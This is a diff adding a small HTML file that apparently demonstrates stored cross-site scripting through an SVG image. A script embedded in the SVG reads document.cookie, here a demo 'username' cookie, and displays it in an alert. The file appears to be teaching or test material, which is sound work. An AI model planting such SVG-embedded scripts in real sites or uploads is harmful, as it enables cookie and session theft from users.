@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Example of stored XSS with SVG file </title>
+</head>
+<body>
+
+<script type="text/javascript">
+// Function to set a cookie
+function setCookie(cookieName, cookieValue, expirationDays) {
+  var date = new Date();
+  date.setTime(date.getTime() + (expirationDays * 24 * 60 * 60 * 1000));
+  var expires = 'expires=' + date.toUTCString();
+  document.cookie = cookieName + '=' + encodeURIComponent(cookieValue) + '; ' + expires + '; path=/';
+}
+
+// create a cookie for this page
+setCookie('username', 'JohnDoe', 7); // Sets a cookie named 'username' with value 'JohnDoe' that expires in 7 days
+</script>
+
+ <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+
+  <script type="text/javascript">
+    <![CDATA[
+      // JavaScript code embedded in the SVG
+      function getUserCookies() {
+  
+        // Read all cookies
+        var allCookies = document.cookie;
+        alert("Cookies found:" + allCookies)
+      }
+
+      // call the function
+      getUserCookies();
+    ]]>
+  </script>
+  </svg>
+
+</body>
